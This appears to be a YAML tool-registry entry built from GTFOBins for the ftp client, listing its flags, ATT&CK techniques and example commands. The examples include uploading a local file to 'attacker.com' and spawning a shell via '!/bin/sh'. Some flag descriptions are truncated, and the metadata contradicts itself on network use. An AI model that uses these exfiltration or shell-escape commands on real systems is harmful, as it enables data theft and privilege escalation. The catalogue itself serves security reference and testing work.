---
id: network-ftp-ftp
namespace: network:ftp:ftp
name: ftp
description: File Transfer Protocol client; can transfer files and spawn shells Can
  also download files, spawn an interactive shell, upload files.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- ftp
parameters:

  - name: flag-4
    type: string
    required: false
    default: null
    description: "Forces tnftp to only use IPv4 addresses"
    aliases:
      - "-4"
  - name: flag-6
    type: string
    required: false
    default: null
    description: "Forces tnftp to only use IPv6 addresses"
    aliases:
      - "-6"
  - name: flag-a
    type: string
    required: false
    default: null
    description: "Causes tnftp to bypass normal login procedure, and use an"
    aliases:
      - "-a"
  - name: flag-b
    type: string
    required: false
    default: null
    description: "to bufsize bytes. The default bufsize is 16384 (16 KiB)"
    aliases:
      - "-b"
  - name: flag-d
    type: string
    required: false
    default: null
    description: "Enables debugging"
    aliases:
      - "-d"
  - name: flag-e
    type: string
    required: false
    default: null
    description: "Disables command line editing. This is useful for Emacs"
    aliases:
      - "-e"
  - name: flag-f
    type: string
    required: false
    default: null
    description: "Forces a cache reload for transfers that go through the FTP"
    aliases:
      - "-f"
  - name: flag-g
    type: string
    required: false
    default: null
    description: "Disables file name globbing"
    aliases:
      - "-g"
  - name: flag-H
    type: url
    required: false
    default: null
    description: "Include the provided header string as a custom HTTP header"
    aliases:
      - "-H"
  - name: flag-i
    type: string
    required: false
    default: null
    description: "Turns off interactive prompting during multiple file trans-"
    aliases:
      - "-i"
  - name: flag-N
    type: string
    required: false
    default: null
    description: "Use netrc instead of ~/.netrc. Refer to \"THE .netrc FILE\""
    aliases:
      - "-N"
  - name: flag-n
    type: string
    required: false
    default: null
    description: "Restrains tnftp from attempting \"auto-login\" upon initial"
    aliases:
      - "-n"
  - name: flag-o
    type: string
    required: false
    default: null
    description: "When auto-fetching files, save the contents in output"
    aliases:
      - "-o"
  - name: flag-P
    type: integer
    required: false
    default: null
    description: "Sets the port number to port"
    aliases:
      - "-P"
  - name: flag-p
    type: string
    required: false
    default: null
    description: "Enable passive mode operation for use behind connection fil-"
    aliases:
      - "-p"
  - name: flag-q
    type: number
    required: false
    default: null
    description: "Quit if the connection has stalled for quittime seconds"
    aliases:
      - "-q"
  - name: flag-r
    type: string
    required: false
    default: null
    description: "Retry the connection attempt if it failed, pausing for retry"
    aliases:
      - "-r"
  - name: flag-s
    type: string
    required: false
    default: null
    description: ""
    aliases:
      - "-s"
  - name: flag-t
    type: string
    required: false
    default: null
    description: "Enables packet tracing"
    aliases:
      - "-t"
  - name: flag-T
    type: number
    required: false
    default: null
    description: "Set the maximum transfer rate for direction to maximum bytes/second, and if specified, the increment to increment bytes/second. Refer to rate for more information"
    aliases:
      - "-T"
  - name: flag-u
    type: url
    required: false
    default: null
    description: "Upload files on the command line to url where url is one of the `ftp://' URL types as supported by auto-fetch (with an optional target filename for single file uploads), and file is one or more local files to be uploaded"
    aliases:
      - "-u"
  - name: flag-v
    type: string
    required: false
    default: null
    description: "Enable verbose and progress. This is the default if output"
    aliases:
      - "-v"
  - name: flag-x
    type: string
    required: false
    default: null
    description: "Set the size of the socket send and receive buffers to xfersize bytes. Refer to xferbuf for more information"
    aliases:
      - "-x"
  - name: flag-?
    type: string
    required: false
    default: null
    description: "Display help to stdout, and exit"
    aliases:
      - "-?"

features:
- file-system
- interactive
- local
- network-intensive
- process-manip
- remote
- requires-root
execution:
  template: ftp
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files
  command: 'ftp -a attacker.com

    get /path/to/input-file output-file'
- description: Spawn an interactive shell
  command: 'ftp

    !/bin/sh'
- description: Upload files
  command: 'ftp -a attacker.com

    put /path/to/input-file output-file'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/ftp/
techniques:
- collection
- privilege-escalation
- execution
- exfiltration
install:
- method: apt
  package_name: ftp
  commands:
  - apt-get install -y ftp
mitre_ids:
- T1005
- T1048
- T1074
- T1114
---

# ftp

ftp is a command-line utility. File Transfer Protocol client; can transfer files and spawn shells Can also download files, spawn an interactive shell, upload files.
